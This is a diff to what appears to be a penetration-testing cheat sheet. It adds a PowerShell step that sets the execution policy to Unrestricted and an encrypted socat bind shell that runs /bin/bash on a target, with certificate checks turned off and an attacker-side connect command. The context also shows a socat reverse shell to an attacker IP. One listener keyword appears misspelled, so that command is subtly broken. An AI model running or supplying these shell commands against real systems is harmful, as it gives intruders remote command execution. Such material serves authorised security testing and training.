@@ -1480,6 +1480,10 @@ pipreqs --force
 
 ## POWERSHELL
 ```powershell
+# execution policy
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+
 # import module
 Import-Module module_name_here
 
@@ -1809,8 +1813,13 @@ socat TCP4:attacker_IP:port_here EXEC:/bin/bash
 
 # encrypted bind shell
 # genereate self-signed cert
-openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
-# combine 
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 363 -out shell.crt
+# combine cert + private key into .pem
+cat shell.key shell.crt > shell.pem
+# set up listener on target, no SSL cert validation
+socat OPENSSL-LISTENER:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
+# connect from attacker machine
+socat - OPENSSL:target_IP:443,verify=0
 ```
 
 
